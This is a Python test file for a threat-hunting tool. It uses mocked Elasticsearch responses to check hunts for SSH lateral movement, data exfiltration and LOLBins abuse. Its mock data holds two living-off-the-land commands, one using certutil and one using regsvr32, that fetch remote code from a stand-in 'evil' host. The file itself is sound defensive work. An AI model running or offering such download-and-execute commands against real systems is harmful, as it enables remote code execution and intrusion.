"""
test_day27_hunts.py

Local logic test (mocked ES) — pre-deploy validation, same pattern as Day 24's
test_day24.py. No live cluster needed. Run on its own machine/sandbox to prove
the YAML loads, the TIME_WINDOW_HOURS / FINDING_THRESHOLD placeholders get
substituted correctly, and the escalate logic fires/doesn't fire as expected —
*before* pointing it at the real ~/elastic stack.
"""
import json
import sys
from unittest.mock import patch

from tools.hunt_loader import load_hunt_playbooks, run_yaml_hunt, _render_query

PASS = 0
FAIL = 0


def check(label, condition):
    global PASS, FAIL
    if condition:
        PASS += 1
        print(f"  [PASS] {label}")
    else:
        FAIL += 1
        print(f"  [FAIL] {label}")


# ── Sample / mock ES responses, keyed by which hunt is being tested ────────

LATERAL_MOVEMENT_HIT = {
    "aggregations": {
        "hosts": {
            "buckets": [
                {"key": "agent1", "doc_count": 12,
                 "distinct_src_ips": {"value": 4}}
            ]
        }
    }
}
LATERAL_MOVEMENT_MISS = {
    "aggregations": {"hosts": {"buckets": []}}
}

EXFIL_HIT = {
    "aggregations": {
        "hosts": {
            "buckets": [
                {"key": "agent1", "doc_count": 40,
                 "total_bytes_out": {"value": 700000000}}
            ]
        }
    }
}
EXFIL_MISS = {
    "aggregations": {"hosts": {"buckets": []}}
}

LOLBINS_HIT = {
    "hits": {"hits": [
        {"_source": {"data": {"command": "certutil -urlcache -split -f http://evil/x"}}},
        {"_source": {"data": {"command": "regsvr32 /s /u /i:http://evil/x.sct scrobj.dll"}}},
    ]}
}
LOLBINS_MISS = {"hits": {"hits": []}}


EXFIL_PROXY_HIT = {
    "aggregations": {
        "hosts": {
            "buckets": [
                {"key": "agent1", "doc_count": 35,
                 "distinct_external_ips": {"value": 27}}
            ]
        }
    }
}
EXFIL_PROXY_MISS = {
    "aggregations": {"hosts": {"buckets": []}}
}


REQUIRED_HUNT_NAMES = {
    "lateral_movement_ssh", "data_exfiltration_volume",
    "data_exfiltration_volume_proxy", "lolbins_execution",
}


def test_load_playbooks():
    print("\n=== load_hunt_playbooks() ===")
    playbooks = load_hunt_playbooks()
    # Minimum, not exact: the loader auto-discovers every *.yml in hunts/ by
    # design (Day 26's "no code changes to add a hunt" philosophy) — an
    # exact count here would break the moment Day 28 adds Hunts 4-5.
    check("loads at least the 4 known playbooks", len(playbooks) >= 4)
    names = {pb["hunt_name"] for pb in playbooks}
    check("all 4 known hunt_names present", REQUIRED_HUNT_NAMES.issubset(names))
    for pb in playbooks:
        for field in ("hypothesis", "elastic_query", "finding_threshold",
                       "mitre_technique", "escalate_if_found"):
            check(f"{pb['hunt_name']} has '{field}'", field in pb)
    return {pb["hunt_name"]: pb for pb in playbooks}


def test_placeholder_substitution(by_name):
    print("\n=== placeholder substitution ===")
    lm = by_name["lateral_movement_ssh"]
    rendered = _render_query(lm)
    raw_str = json.dumps(rendered)
    check("no leftover TIME_WINDOW_HOURS placeholder", "TIME_WINDOW_HOURS" not in raw_str)
    check("no leftover FINDING_THRESHOLD placeholder", "FINDING_THRESHOLD" not in raw_str)
    check("time window correctly substituted (now-24h)",
          rendered["query"]["bool"]["filter"][1]["range"]["@timestamp"]["gte"] == "now-24h")
    check("threshold correctly substituted (>= 3)",
          "params.distinctIps >= 3" in raw_str)

    exfil = by_name["data_exfiltration_volume"]
    rendered2 = _render_query(exfil)
    raw_str2 = json.dumps(rendered2)
    check("exfil window substituted (now-1h)",
          rendered2["query"]["bool"]["filter"][0]["range"]["@timestamp"]["gte"] == "now-1h")
    check("exfil threshold substituted (> 524288000)",
          "params.bytesOut > 524288000" in raw_str2)


def test_lateral_movement(by_name):
    print("\n=== Hunt 1: lateral_movement_ssh ===")
    pb = by_name["lateral_movement_ssh"]
    with patch("tools.hunt_loader._post", return_value=LATERAL_MOVEMENT_HIT):
        result = run_yaml_hunt(pb)
    check("positive case: threats_found == 1", result["threats_found"] == 1)
    check("positive case: escalate == True", result["escalate"] is True)
    check("mitre_technique carried through", result["mitre_technique"] == "T1021.004")

    with patch("tools.hunt_loader._post", return_value=LATERAL_MOVEMENT_MISS):
        result = run_yaml_hunt(pb)
    check("negative case: threats_found == 0", result["threats_found"] == 0)
    check("negative case: escalate == False", result["escalate"] is False)


def test_exfil(by_name):
    print("\n=== Hunt 2: data_exfiltration_volume ===")
    pb = by_name["data_exfiltration_volume"]
    with patch("tools.hunt_loader._post", return_value=EXFIL_HIT):
        result = run_yaml_hunt(pb)
    check("positive case: threats_found == 1", result["threats_found"] == 1)
    check("positive case: escalate == True", result["escalate"] is True)

    with patch("tools.hunt_loader._post", return_value=EXFIL_MISS):
        result = run_yaml_hunt(pb)
    check("negative case: threats_found == 0", result["threats_found"] == 0)
    check("negative case: escalate == False", result["escalate"] is False)


def test_exfil_proxy(by_name):
    print("\n=== Hunt 2b: data_exfiltration_volume_proxy ===")
    pb = by_name["data_exfiltration_volume_proxy"]
    with patch("tools.hunt_loader._post", return_value=EXFIL_PROXY_HIT):
        result = run_yaml_hunt(pb)
    check("positive case: threats_found == 1", result["threats_found"] == 1)
    # escalate_if_found is deliberately False for this hunt (untuned
    # placeholder threshold) — a real finding should still be surfaced in
    # threats_found/findings for an analyst to see, but must NOT auto-escalate.
    check("positive case: escalate == False (escalate_if_found is off by design)",
          result["escalate"] is False)

    with patch("tools.hunt_loader._post", return_value=EXFIL_PROXY_MISS):
        result = run_yaml_hunt(pb)
    check("negative case: threats_found == 0", result["threats_found"] == 0)
    check("negative case: escalate == False", result["escalate"] is False)


def test_lolbins(by_name):
    print("\n=== Hunt 3: lolbins_execution ===")
    pb = by_name["lolbins_execution"]
    with patch("tools.hunt_loader._post", return_value=LOLBINS_HIT):
        result = run_yaml_hunt(pb)
    check("positive case: threats_found == 2", result["threats_found"] == 2)
    check("positive case: escalate == True", result["escalate"] is True)

    with patch("tools.hunt_loader._post", return_value=LOLBINS_MISS):
        result = run_yaml_hunt(pb)
    check("negative case: threats_found == 0", result["threats_found"] == 0)
    check("negative case: escalate == False", result["escalate"] is False)


def test_no_es_call_crashes_engine(by_name):
    print("\n=== ES call failure is handled, never raises ===")
    pb = by_name["lateral_movement_ssh"]
    with patch("tools.hunt_loader._post", side_effect=ConnectionError("no route to host")):
        result = run_yaml_hunt(pb)
    check("failure returns threats_found=0", result["threats_found"] == 0)
    check("failure returns escalate=False", result["escalate"] is False)
    check("failure message captured in hunt_summary",
          "failed to query ES" in result["hunt_summary"])


if __name__ == "__main__":
    by_name = test_load_playbooks()
    test_placeholder_substitution(by_name)
    test_lateral_movement(by_name)
    test_exfil(by_name)
    test_exfil_proxy(by_name)
    test_lolbins(by_name)
    test_no_es_call_crashes_engine(by_name)

    print(f"\n{'='*50}\nScore: {PASS}/{PASS + FAIL} checks passed\n{'='*50}")
    sys.exit(0 if FAIL == 0 else 1)
